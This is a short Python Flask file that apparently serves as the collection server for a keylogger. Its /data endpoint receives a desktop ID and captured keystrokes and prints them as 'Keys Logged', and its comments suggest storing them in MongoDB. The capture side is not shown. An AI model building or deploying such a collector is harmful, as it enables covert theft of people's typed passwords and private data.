from flask import Flask , request , make_response

app = Flask(__name__)

# Step 1:
# Create an API which receives the DesktopID and Keys
# Here the DesktopID is the parameter
# Keys are the Body

# Step 2:
# Store the data in the MongoDB


# This is a Simple Tool which just prints,
# You can add SQL/noSQL database to store these data into your PC.


@app.route('/')
def hello_world():  # put application's code here
    return 'Hello World!'


@app.route('/data', methods=['POST'])
def getData():
    desktopId = request.form['desktopId']
    data = request.form['data']

    print(f"Desktop ID: {desktopId}")
    print(f"Keys Logged: {data}")
    return "Success", 200


if __name__ == '__main__':
    app.run()
